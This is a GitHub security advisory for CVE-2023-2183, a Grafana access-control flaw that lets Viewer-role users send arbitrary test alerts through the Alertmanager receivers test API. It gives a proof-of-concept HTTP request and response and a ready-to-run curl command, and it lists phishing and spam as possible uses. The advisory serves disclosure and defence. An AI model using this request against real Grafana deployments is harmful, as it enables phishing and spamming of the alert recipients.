# [M] Grafana has Broken Access Control in Alert manager: Viewer can send test alerts

## Summary
Severity: Medium
Advisory: GHSA-cvm3-pp2j-chr3
CVE: CVE-2023-2183
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2023-06-12
Source: https://github.com/advisories/GHSA-cvm3-pp2j-chr3
Type: github-advisory

## Affected
- Go: `github.com/grafana/grafana` — affected >=0 <8.5.26
- Go: `github.com/grafana/grafana` — affected >=9.0.0 <9.2.19
- Go: `github.com/grafana/grafana` — affected >=9.3.0 <9.3.15
- Go: `github.com/grafana/grafana` — affected >=9.4.0 <9.4.12
- Go: `github.com/grafana/grafana` — affected >=9.5.0 <9.5.3

## Details
### Summary
Grafana allows an attacker in the Viewer role, send alerts by API Alert - Test. The option is not available from the user panel UI for in the Viewer role. 

**Reason for the error**: The API does not check access to this function and allows it by users with the least rights, for example, the Viewer that does not see this option in the user panel. 

This enables malicious users to abuse the functionality by sending multiple alert messages (e-mail, slack, etc…), spamming users, prepare Phishing attack or blocked SMTP server / IP and automatically moved all message to spam folder, add to black list IP.


### Details
The logged-in user, in the Viewer role, in the user panel, does not have access to the test option of sending an e-mail alert. 

View of the panel for the user in the Viewer role:
![image](https://user-images.githubusercontent.com/1643385/232904030-e8a8338d-f5e3-4b04-80c3-32f2164a190e.png)

Admin role - View panel for admin role:
![image](https://user-images.githubusercontent.com/1643385/232904264-c7aba0a5-0642-496b-998d-d500eb5ead7f.png)

Admin role - Next step – editing:
![image](https://user-images.githubusercontent.com/1643385/232904388-ef2ee69e-3ee3-41a9-8687-305886c5c0b9.png)

Admin role - Additional options:
![image](https://user-images.githubusercontent.com/1643385/232904480-dd493d34-d66d-47af-ab4f-3273ae8976bc.png)



### PoC

**HTTP Request by user in role Viewer**
```
POST /api/alertmanager/grafana/config/api/v1/receivers/test HTTP/1.1
Host: xxx
Cookie: grafana_session=xxx
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xxx/alerting/notifications/receivers/grafana-default-email/edit?alertmanager=grafana
accept: application/json, text/plain, */*
content-type: application/json
…

{"receivers":[{"name":"test","grafana_managed_receiver_configs":[{"settings":{"addresses":"<test@example.com>",
"singleEmail":true},"secureSettings":{},"type":"email","name":"test","disableResolveMessage":false}]}],
"alert":{"annotations":{"runbook_url":"http://example.com ","description":"tekst","testowy":"test http://example.com",
"more":"http://example.com "},"labels":{}}}

```

**HTTP Response:**
```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: application/json
Expires: -1
Pragma: no-cache
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-Xss-Protection: 1; mode=block
Date: Wed, 05 Apr 2023 10:43:00 GMT
Content-Length: 471

{"alert":{"annotations":{"__value_string__":"[ metric='foo' labels={instance=bar} value=10 ]","description":"tekst",
"more":"http://example.com","runbook_url":"http://example.com","summary":"Notification test",
"testowy":"testowy http://example.com"},"labels":{"alertname":"TestAlert","instance":"Grafana"}},
"receivers":[{"name":"test","grafana_managed_receiver_configs":[{"name":"test","uid":"ojUhNFL4k","status":"ok"}]}],
"notified_at":"2023-04-05T12:43:00.1430203+02:00"}

```

## Result:
The attacker can send as a template alert or plain/text.

![image](https://user-images.githubusercontent.com/1643385/232917993-1294cfe0-3040-4d04-a533-a72ecbc666c0.png)


### Impact
As I showed above, an enabled user in the lowest role can execute an endpoint API that allows him to send an e-mail as an alert and impersonate its content. If modified accordingly, the recipient may fall victim to a Phishing attack or a targeted attack to block the SMTP server. 

From a practical point of view, this means that for each "GrafanaReceiver" e.g.: Slack, E-mail, etc.. You can send any alert message from user with the least privileged. 

CURL example – using a user session in the Viewer role:

```
curl -i -s -k -X $'POST' \
    -H $'Host: localhost:3002' -H $'Content-Length: 386' -H $'sec-ch-ua: \"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"' -H $'accept: application/json, text/plain, */*' -H $'content-type: application/json' -H $'x-grafana-org-id: 1' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/527.36 (KHTML, like Gecko) Chrome/112.0.2615.50 Safari/11.36' -H $'sec-ch-ua-platform: \"macOS\"' -H $'Origin: http://localhost:3002' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: http://localhost:3002/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Connection: close' \
    -b $'grafana_session=xxx' \
    --data-binary $'{\"receivers\":[{\"name\":\"test\",\"grafana_managed_receiver_configs\":[{\"settings\":{\"addresses\":\"<test@example.com>\",\"singleEmail\":true\x0d\x0a},\"secureSettings\":{},\"type\":\"email\",\"name\":\"test\",\"disableResolveMessage\":false}]}],\"alert\":{\"annotations\":{\"runbook_url\":\"http://example.com\",\"description\":\"tekst\",\"testowy\":\"testowy http://example.com\",\x0d\x0a\"more\":\"http://example.com\"\x0d\x0a},\"labels\":{}}}\x0d\x0a' \
    $'http://localhost:3002/api/alertmanager/grafana/config/api/v1/receivers/test'
```

### Mitigation

1. In the SMTP server configuration settings, limit the ability to send multiple e-mails to the same e-mail address per unit of time / threshold. 
2. Check the API for the possibility of accessing this endpoint for other roles than admin

## References
- https://github.com/grafana/bugbounty/security/advisories/GHSA-cvm3-pp2j-chr3
- https://nvd.nist.gov/vuln/detail/CVE-2023-2183
- https://github.com/grafana/bugbounty
- https://grafana.com/security/security-advisories/cve-2023-2183
